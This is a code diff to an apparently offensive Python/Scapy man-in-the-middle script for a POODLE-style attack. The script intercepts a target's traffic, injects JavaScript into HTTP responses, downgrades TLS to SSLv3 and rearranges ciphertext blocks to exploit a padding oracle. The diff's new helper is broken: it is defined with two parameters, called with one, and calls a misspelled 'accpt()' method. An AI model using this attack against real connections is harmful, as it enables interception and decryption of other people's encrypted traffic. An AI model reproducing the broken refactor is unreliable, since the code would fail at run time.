@@ -57,8 +57,13 @@ def copy_block_to_end(arr, copy_index):
 	arr_list[last_index:(last_index+block_size)] = arr[copy_index:(copy_index+block_size)]
 	return bytes(arr_list)
 
-def is_tls_data(data):
-	return len([i for i in range(len(data)) if list(data)[i:i+3] == [0x17, 0x03, 0x00]]) > 0
+def modify_and_send_packet(packet, pkt):
+	del pkt[IP].chksum
+	del pkt[TCP].chksum
+	packet.set_payload(bytes(pkt))
+	packet.accpt()
+
+	
 
 def callback(packet):
 	global block_size
@@ -86,7 +91,9 @@ def callback(packet):
 			# modify http to ensure headers
 
 			pkt['HTTP']['Raw'].load = raw_http
-			packet.set_payload(bytes(pkt))
+
+			modify_and_send_packet(pkt)
+			return
 
 			#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
 	#		pkt.getlayer(HTTP).show()
@@ -101,7 +108,9 @@ def callback(packet):
 		elif pkt.dst == config['target'] and 'HTTP' in pkt:
 			print("HTTP Payload: " + str(pkt['HTTP']['Raw'].load))
 			pkt['HTTP']['Raw'].load += bytes(js_client_html, 'utf8')
-			packet.set_payload(bytes(pkt))
+
+			modify_and_send_packet(pkt)
+			return
 
 	if pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
 		print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
@@ -150,12 +159,7 @@ def callback(packet):
 			sessions[src_port].ciphertext = bytes(pkt)[tls_data_start_index:]
 
 			new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
-			new_packet = IP(new_bytes)
-			del new_packet[IP].chksum
-			del new_packet[TCP].chksum
-
-			packet.set_payload(bytes(new_packet))
-			packet.accept()
+			modify_and_send_packet(IP(new_bytes))
 			return
 
 	elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt and block_size is not None:
@@ -164,7 +168,8 @@ def callback(packet):
 		if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
 			print("Downgrading server packet")
 			# Change handshake status to failed
-			packet.set_payload(bytes(pkt))
+			modify_and_send_packet(pkt)
+			return
 
 		# If we get success (data instead of alert), do math to get byte
 		elif get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dport in sessions:
